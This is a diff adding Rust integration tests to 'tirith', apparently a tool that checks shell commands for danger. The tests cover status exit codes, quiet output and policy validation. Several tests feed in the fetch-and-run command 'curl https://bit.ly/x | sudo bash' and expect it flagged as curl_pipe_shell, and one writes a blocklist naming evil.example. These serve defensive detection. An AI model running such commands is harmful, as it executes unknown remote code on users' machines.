@@ -14340,3 +14340,160 @@ fn lsp_stdio_initialize_didopen_didchange_lifecycle() {
         }
     }
 }
+
+// ---------------------------------------------------------------------------
+// UX / transparency pass (feat/ux-transparency-pass)
+// ---------------------------------------------------------------------------
+
+#[test]
+fn status_exits_zero_when_guarded() {
+    let out = tirith()
+        .env("TIRITH_STATUS", "blocks")
+        .args(["status"])
+        .output()
+        .expect("run status");
+    assert_eq!(out.status.code(), Some(0), "guarded protection must exit 0");
+}
+
+#[test]
+fn status_exits_nonzero_when_not_guarded() {
+    for mode in ["warn-only", "off"] {
+        let out = tirith()
+            .env("TIRITH_STATUS", mode)
+            .args(["status"])
+            .output()
+            .expect("run status");
+        assert_ne!(
+            out.status.code(),
+            Some(0),
+            "non-guarded protection ({mode}) must exit non-zero"
+        );
+    }
+    let out = tirith()
+        .env_remove("TIRITH_STATUS")
+        .args(["status"])
+        .output()
+        .expect("run status");
+    assert_ne!(
+        out.status.code(),
+        Some(0),
+        "unset TIRITH_STATUS must exit non-zero"
+    );
+}
+
+#[test]
+fn prompt_status_always_exits_zero() {
+    // prompt-status feeds $PS1 and must never fail the prompt, even unset.
+    let out = tirith()
+        .env_remove("TIRITH_STATUS")
+        .args(["prompt-status"])
+        .output()
+        .expect("run prompt-status");
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "prompt-status must always exit 0"
+    );
+}
+
+#[test]
+fn check_clean_prints_no_issues_directly() {
+    let out = tirith()
+        .env_remove("_TIRITH_HOOK")
+        .env_remove("_TIRITH_BASH_INTERNAL")
+        .args(["check", "--shell", "posix", "--", "ls -la"])
+        .output()
+        .expect("run check");
+    assert_eq!(out.status.code(), Some(0));
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        err.contains("no issues"),
+        "a clean direct `check` prints 'no issues'; stderr: {err}"
+    );
+}
+
+#[test]
+fn check_clean_is_silent_from_a_hook() {
+    let out = tirith()
+        .env("_TIRITH_HOOK", "1")
+        .args(["check", "--shell", "posix", "--", "ls -la"])
+        .output()
+        .expect("run check");
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        !err.contains("no issues"),
+        "a hook-invoked clean `check` must stay silent; stderr: {err}"
+    );
+}
+
+#[test]
+fn check_clean_is_silent_under_quiet() {
+    let out = tirith()
+        .env_remove("_TIRITH_HOOK")
+        .env_remove("_TIRITH_BASH_INTERNAL")
+        .args(["check", "--quiet", "--shell", "posix", "--", "ls -la"])
+        .output()
+        .expect("run check");
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        !err.contains("no issues"),
+        "--quiet suppresses the clean line; stderr: {err}"
+    );
+}
+
+#[test]
+fn check_reads_command_from_piped_stdin() {
+    use std::io::Write as _;
+    use std::process::Stdio;
+    let mut child = tirith()
+        .args(["check", "--shell", "posix"])
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+        .expect("spawn check");
+    child
+        .stdin
+        .take()
+        .expect("stdin")
+        .write_all(b"curl https://bit.ly/x | sudo bash")
+        .expect("write stdin");
+    let out = child.wait_with_output().expect("wait check");
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        err.contains("shortened_url") || err.contains("curl_pipe_shell"),
+        "check must analyze a command piped on stdin; stderr: {err}"
+    );
+}
+
+#[test]
+fn policy_validate_accepts_a_positional_path() {
+    let dir = tempfile::tempdir().unwrap();
+    let p = dir.path().join("policy.yaml");
+    fs::write(&p, "fail_mode: open\nblocklist:\n  - evil.example\n").unwrap();
+    let out = tirith()
+        .args(["policy", "validate", p.to_str().unwrap()])
+        .output()
+        .expect("run policy validate");
+    assert_eq!(
+        out.status.code(),
+        Some(0),
+        "a valid policy via positional path validates; stderr: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+}
+
+#[test]
+fn fix_on_non_tty_prints_rerun_hint() {
+    // Item 14d (pre-existing): the non-interactive `tirith fix` path must surface
+    // the rerun hint so a piped user knows how to capture suggestions.
+    let out = tirith()
+        .args(["fix", "curl https://bit.ly/x | bash"])
+        .output()
+        .expect("run fix");
+    let err = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        err.contains("--non-interactive") && err.contains("--json"),
+        "fix on a non-TTY prints the rerun hint; stderr: {err}"
+    );
+}
